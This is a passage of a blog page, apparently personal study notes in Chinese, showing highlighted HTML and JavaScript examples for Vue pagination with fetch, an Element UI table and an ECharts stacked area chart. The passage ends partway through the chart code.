class=\"keyword\">new</span> <span class=\"title class_\">Vue</span>(&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"attr\">el</span>: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"attr\">data</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"attr\">emps</span>: [],</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"attr\">currentPage</span>: <span class=\"number\">1</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"attr\">totalPage</span>: <span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"attr\">loading</span>: <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// prev: &#x27;&#x27;,</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// next: &#x27;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"title function_\">created</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"title function_\">getEmpData</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"attr\">methods</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"title function_\">getEmpData</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"property\">loading</span> = <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"keyword\">const</span> url = <span class=\"string\">&#x27;需要传入的JSON的URL:http://xxxx/?page=$&#123;this.currentPage&#125;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"title function_\">fetch</span>(url, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"attr\">headers</span>: &#123; <span class=\"string\">&quot;token&quot;</span>: <span class=\"string\">&quot;xxxxx...&quot;</span> &#125; <span class=\"comment\">/* 进入该URL所需的令牌 */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">resp</span>) =&gt;</span> resp.<span class=\"title function_\">json</span>()) <span class=\"comment\">/* &#123;return resp.json()&#125; */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">json</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"property\">emps</span> = json.<span class=\"property\">results</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"property\">totalPage</span> = <span class=\"built_in\">parseInt</span>((json.<span class=\"property\">count</span> - <span class=\"number\">1</span>) / pageSize) + <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"property\">loading</span> = <span class=\"literal\">false</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t&#125;, <span class=\"number\">500</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"title function_\">prevPage</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">currentPage</span> &gt; <span class=\"number\">1</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"property\">currentPage</span> -= <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"title function_\">getEmpData</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"title function_\">nextPage</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">currentPage</span> &lt; <span class=\"variable language_\">this</span>.<span class=\"property\">totalPage</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"property\">currentPage</span> += <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"variable language_\">this</span>.<span class=\"title function_\">getEmpData</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Vue-Element-UI框架-html\"><a href=\"#Vue-Element-UI框架-html\" class=\"headerlink\" title=\"Vue_Element_UI框架.html\"></a>Vue_Element_UI框架.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">1.引入样式</span></span><br><span class=\"line\"><span class=\"comment\">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui/lib/theme-chalk/index.css&quot;&gt;</span></span><br><span class=\"line\"><span class=\"comment\">2.引入组件库</span></span><br><span class=\"line\"><span class=\"comment\">&lt;script src=&quot;https://unpkg.com/element-ui/lib/index.js&quot;&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">https://element.eleme.cn/#/zh-CN/component/table</span></span><br><span class=\"line\"><span class=\"comment\">https://unpkg.com/browse/vue@2.6.10/dist/vue.min.js</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://unpkg.com/browse/element-ui@2.15.8/lib/theme-chalk/index.css&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">el-table</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t    <span class=\"attr\">:data</span>=<span class=\"string\">&quot;tableData&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t    <span class=\"attr\">stripe</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t    <span class=\"attr\">style</span>=<span class=\"string\">&quot;width: 100%&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">prop</span>=<span class=\"string\">&quot;date&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">label</span>=<span class=\"string\">&quot;日期&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">width</span>=<span class=\"string\">&quot;180&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">prop</span>=<span class=\"string\">&quot;name&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">label</span>=<span class=\"string\">&quot;姓名&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">width</span>=<span class=\"string\">&quot;180&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">prop</span>=<span class=\"string\">&quot;address&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t      <span class=\"attr\">label</span>=<span class=\"string\">&quot;地址&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t    <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\">\t\t\t  <span class=\"tag\">&lt;/<span class=\"name\">el-table</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;unpkg.com/react@16.7.0/umd/react.production.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://unpkg.com/browse/element-ui@2.15.8/lib/index.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"keyword\">new</span> <span class=\"title class_\">Vue</span>(&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"attr\">el</span>: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"attr\">data</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"attr\">tableData</span>: [&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">date</span>: <span class=\"string\">&#x27;2016-05-03&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">name</span>: <span class=\"string\">&#x27;王小虎&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">address</span>: <span class=\"string\">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t        &#125;, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">date</span>: <span class=\"string\">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">name</span>: <span class=\"string\">&#x27;王小虎&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">address</span>: <span class=\"string\">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t        &#125;, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">date</span>: <span class=\"string\">&#x27;2016-05-04&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">name</span>: <span class=\"string\">&#x27;王小虎&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">address</span>: <span class=\"string\">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t        &#125;, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">date</span>: <span class=\"string\">&#x27;2016-05-01&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">name</span>: <span class=\"string\">&#x27;王小虎&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">address</span>: <span class=\"string\">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t        &#125;, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">date</span>: <span class=\"string\">&#x27;2016-05-08&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">name</span>: <span class=\"string\">&#x27;王小虎&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">address</span>: <span class=\"string\">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t        &#125;, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">date</span>: <span class=\"string\">&#x27;2016-05-06&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">name</span>: <span class=\"string\">&#x27;王小虎&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">address</span>: <span class=\"string\">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t        &#125;, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">date</span>: <span class=\"string\">&#x27;2016-05-07&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">name</span>: <span class=\"string\">&#x27;王小虎&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t          <span class=\"attr\">address</span>: <span class=\"string\">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t        &#125;]</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Echarts的使用-html\"><a href=\"#Echarts的使用-html\" class=\"headerlink\" title=\"Echarts的使用.html\"></a>Echarts的使用.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">https://echarts.apache.org/zh/tutorial.html#5%20%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8B%20ECharts</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">https://www.bootcdn.cn/echarts/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">https://echarts.apache.org/handbook/zh/get-started/</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>ECharts<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 引入 echarts.js --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.bootcdn.net/ajax/libs/echarts/5.1.1/echarts.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 为ECharts准备一个具备大小（宽高）的Dom --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;main&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;width: 600px;height:400px;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"comment\">// 基于准备好的dom，初始化echarts实例</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">var</span> myChart = echarts.<span class=\"title function_\">init</span>(<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;main&#x27;</span>));</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"comment\">// 指定图表的配置项和数据</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">var</span> option = &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">color</span>: [<span class=\"string\">&#x27;#80FFA5&#x27;</span>, <span class=\"string\">&#x27;#00DDFF&#x27;</span>, <span class=\"string\">&#x27;#37A2FF&#x27;</span>, <span class=\"string\">&#x27;#FF0087&#x27;</span>, <span class=\"string\">&#x27;#FFBF00&#x27;</span>],</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">title</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">text</span>: <span class=\"string\">&#x27;Gradient Stacked Area Chart&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">tooltip</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">trigger</span>: <span class=\"string\">&#x27;axis&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">axisPointer</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;cross&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">label</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">backgroundColor</span>: <span class=\"string\">&#x27;#6a7985&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">legend</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">data</span>: [<span class=\"string\">&#x27;Line 1&#x27;</span>, <span class=\"string\">&#x27;Line 2&#x27;</span>, <span class=\"string\">&#x27;Line 3&#x27;</span>, <span class=\"string\">&#x27;Line 4&#x27;</span>, <span class=\"string\">&#x27;Line 5&#x27;</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">toolbox</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">feature</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">saveAsImage</span>: &#123;&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">grid</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">left</span>: <span class=\"string\">&#x27;3%&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">right</span>: <span class=\"string\">&#x27;4%&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">bottom</span>: <span class=\"string\">&#x27;3%&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"attr\">containLabel</span>: <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">xAxis</span>: [</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;category&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">boundaryGap</span>: <span class=\"literal\">false</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">data</span>: [<span class=\"string\">&#x27;Mon&#x27;</span>, <span class=\"string\">&#x27;Tue&#x27;</span>, <span class=\"string\">&#x27;Wed&#x27;</span>, <span class=\"string\">&#x27;Thu&#x27;</span>, <span class=\"string\">&#x27;Fri&#x27;</span>, <span class=\"string\">&#x27;Sat&#x27;</span>, <span class=\"string\">&#x27;Sun&#x27;</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  ],</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">yAxis</span>: [</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;value&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  ],</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"attr\">series</span>: [</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">name</span>: <span class=\"string\">&#x27;Line 1&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;line&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">stack</span>: <span class=\"string\">&#x27;Total&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">smooth</span>: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">lineStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">width</span>: <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">showSymbol</span>: <span class=\"literal\">false</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">areaStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">opacity</span>: <span class=\"number\">0.8</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">color</span>: <span class=\"keyword\">new</span> echarts.<span class=\"property\">graphic</span>.<span class=\"title class_\">LinearGradient</span>(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, [</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(128, 255, 165)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">1</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(1, 191, 236)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        ])</span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">emphasis</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">focus</span>: <span class=\"string\">&#x27;series&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">data</span>: [<span class=\"number\">140</span>, <span class=\"number\">232</span>, <span class=\"number\">101</span>, <span class=\"number\">264</span>, <span class=\"number\">90</span>, <span class=\"number\">340</span>, <span class=\"number\">250</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">name</span>: <span class=\"string\">&#x27;Line 2&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;line&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">stack</span>: <span class=\"string\">&#x27;Total&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">smooth</span>: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">lineStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">width</span>: <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">showSymbol</span>: <span class=\"literal\">false</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">areaStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span 